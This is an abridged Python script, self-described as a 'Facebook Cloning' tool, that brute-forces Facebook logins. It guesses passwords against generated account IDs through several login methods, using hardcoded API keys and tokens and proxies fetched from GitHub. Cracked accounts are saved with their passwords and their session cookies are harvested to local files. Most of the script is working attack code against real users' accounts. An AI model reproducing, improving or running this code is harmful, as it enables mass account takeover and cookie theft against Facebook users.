...
try:
	prox= requests.get('https://raw.githubusercontent.com/Blacklove1122/main1/main/proxies.txt').text
...
android_models=[]
try:
	xx = requests.get('https://raw.githubusercontent.com/Blacklove1122/main1/main/strings.txt').text.splitlines()
	for line in xx:
...
usr=[]
try:
	xd=requests.get('https://raw.githubusercontent.com/Blacklove1122/main1/main/ua.txt').text.splitlines()
	for us in xd:
		usr.append(us)
except: pass
...
────────────────────────────────────────────────────────────────────        
    \033[1;34m───────────────────────────────────────
    \033[1;31m[ \033[1;32mCODED BY \033[1;31m] \033[1;35m<>  \033[1;32mPrince RAJU 
    \033[1;31m[ \033[1;32mPROGRAME \033[1;31m] \033[1;35m<>  \033[1;32mFacebook Cloning 
    \033[1;31m[ \033[1;32mWHATSAPP \033[1;31m] \033[1;35m<> \033[1;32m +8801792796865 
    \033[1;34m───────────────────────────────────────\033[1;37m"""
def clear():
    os.system("clear")
    print(logo)    
...
def x2():
  ...
  if word in data:
    ...
    os.system('pip install requests')
    print (' Run again : python raju.py')
    exit()
...
def menu_apikey():
  ...
  try:
    ...
    if id in httpCaht:
      ...
      os.system(f'xdg-open {tan}://wa.me/+8801792796865?text='+id)
      time.sleep(2)
      sys.exit()
  except:
    sys.exit()
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[RAJU-M1] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
"api_key": "882a8490361da98702bf97a021ddc14d"}
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[RAJU-M3] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[RAJU-M2] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);KINGb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={KINGb};{ckkk}"
                    print(f"\r{A} [RAJU-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/RAJUOK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SPY_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print(f"\r{R} [RAJU-CP] {sid} | {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/RAJU_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
    ...
    def methodF(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[RAJU-M6] {loop} OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
    ...
    def methodE(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[RAJU-M5] {loop} OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[RAJU-M4] {loop} OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[65:80]
				print('\033[1;92m[RAJU-OK] '+cid+' | '+ps+'\033[1;32m')
				#print(f' Number or Email : {uid}')
				#print(f' Cookie : {coki}')
				open('RAJU-VIP-OK.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(uid)
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[82:97]
				print('\33[1;31m[RAJU-CP] '+cid+' | '+ps+'\33[0;97m')
				open('RAJU-cp.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(uid)
				break
			else:
				continue
